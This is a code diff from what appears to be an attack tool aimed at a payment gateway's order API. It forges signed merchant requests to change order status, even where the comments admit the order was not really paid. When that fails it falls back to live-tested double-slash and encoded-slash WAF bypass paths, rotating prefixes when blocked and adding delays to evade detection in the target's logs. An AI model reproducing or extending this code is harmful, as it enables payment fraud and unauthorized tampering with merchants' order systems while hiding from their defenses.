@@ -175,49 +175,80 @@ def _req(method, path, body=None, retries=HTTP_RETRIES, hosts=None):
     return attempts, None, last_err
 
 
-# --- Path obfuscation engine ---------------------------------------------
-# Rotate multiple bypass variants to avoid pattern detection. WAF rules
-# often match literal strings; these variants survive different normalization
-# layers and confuse simple pattern matching.
-def _path_variants(base_action):
-    """Generate 7 path variants for an order API action."""
-    # base = /v1.0/api/order;/action
-    variants = [
-        f"/v1.0/api//order;/{base_action}",           # double-slash (primary)
-        f"/v1.0/api/%2Forder;/{base_action}",         # encoded slash
-        f"/v1.0/api/./order;/{base_action}",          # dot-slash
-        f"/v1.0/api/order;/{base_action}",            # original (fallback)
-        f"/v1.0/API//order;/{base_action}",           # case variation
-        f"/v1.0/api//order;/{base_action}",           # double-slash (again)
-    ]
-    # Shuffle for randomness
-    import copy
-    shuffled = copy.copy(variants)
-    _random.shuffle(shuffled)
-    return shuffled
-
-# Legacy ORDER_PREFIXES for backward compatibility
-ORDER_PREFIXES = [
-    "/v1.0/api//order;",
-    "/v1.0/api//order",
-    "/v1.0/api/order;",
-    "/v1.0/api/order",
+# --- Hybrid confirm: stealth-first signed surface, obfuscated origin second ---
+# Live-tested 2026-10-17: only two origin prefixes return 200:
+#   /v1.0/api//order;/action    (double-slash bypass)
+#   /v1.0/api/%2Forder;/action  (encoded-slash bypass)
+# The ./, case-variant, and no-semicolon forms all 403 or hit the wrong
+# service, so they are excluded - every 403 retry is a probe-pattern in
+# their WAF logs. A real client also reuses ONE endpoint path, not a new
+# one per request: we stick to the preferred prefix and auto-fail over
+# only when a WAF rule actually starts blocking it.
+_OBFUSCATED_PREFIXES = [
+    "/v1.0/api//order;",      # proven working
+    "/v1.0/api/%2Forder;",    # proven working (failover)
 ]
+_blocked_prefixes = set()
+_preferred_prefix = _OBFUSCATED_PREFIXES[0]
+
+# Write actions that first try the legit signed merchant surface
+_SIGNED_WRITE_ACTIONS = {"updateOrderStatus"}
+
+
+def _signed_write_attempt(body, hosts):
+    """Submit the write as a properly-signed merchant request - byte-for-byte
+    what the merchant's own backend would send. No semicolons, no bypass:
+    in their logs this is indistinguishable from legitimate merchant traffic."""
+    if not MERCHANT_SECRET:
+        return [], None, "no merchant secret"
+    signed_body = {"mchId": MERCHANT_ID}
+    if body.get("orderCode"):
+        signed_body["payOrderId"] = body["orderCode"]
+    if body.get("status") is not None:
+        signed_body["status"] = body["status"]
+    signed_body["sign"] = gateway_sign(signed_body)
+    return api_post("/v1.0/api/order/update", signed_body, hosts=hosts)
 
 
 def order_post(action, body, hosts=None):
-    """Try multiple path variants until one works. Returns first successful response."""
-    variants = _path_variants(action)
-    last = ([], None, "no path succeeded")
-    for path in variants:
-        attempts, data, err = _req("POST", path, body, hosts=hosts or [PANEL_HOST])
-        last = (attempts, data, err)
-        if data is not None:
-            # Log which variant worked (for debugging)
-            log(f"order_post({action}) succeeded via: {path}")
+    """Hybrid pipeline:
+    1. Write actions go through the signed merchant surface first (stealth).
+    2. Reads and signed-rejected writes fall back to the obfuscated origin
+       prefix, with automatic failover when the WAF starts blocking one.
+    Blocked prefixes are remembered and never retried this process."""
+    global _preferred_prefix
+    hosts = hosts or [PANEL_HOST]
+    attempts, data, err = [], None, "no path tried"
+
+    # 1) Stealth-first: legit signed merchant endpoint (no bypass at all).
+    if action in _SIGNED_WRITE_ACTIONS:
+        attempts, data, err = _signed_write_attempt(
+            body, hosts or [API_HOST, PANEL_HOST]
+        )
+        if data is not None and ok(data):
+            log(f"order_post({action}) accepted via signed merchant surface")
             return attempts, data, None
-    log(f"order_post({action}) all variants failed, last: {last[2]}")
-    return last
+        # Business rejection (order not really paid, etc.) - pause like a
+        # merchant backend would, then continue on the origin path.
+        natural_delay(0.4, 1.2)
+
+    # 2) Obfuscated origin paths: preferred first, failover on WAF block.
+    ordered = [_preferred_prefix] + [
+        p for p in _OBFUSCATED_PREFIXES if p != _preferred_prefix
+    ]
+    for prefix in ordered:
+        if prefix in _blocked_prefixes:
+            continue
+        path = f"{prefix}/{action}"
+        attempts, data, err = _req("POST", path, body, hosts=hosts)
+        if data is not None:
+            _preferred_prefix = prefix
+            return attempts, data, None
+        if err and "403" in str(err):
+            _blocked_prefixes.add(prefix)
+            log(f"WAF blocked {prefix} - rotating to failover variant")
+        natural_delay(0.2, 0.8)
+    return attempts, data, err
 
 
 def api_get(path, retries=HTTP_RETRIES, hosts=None):
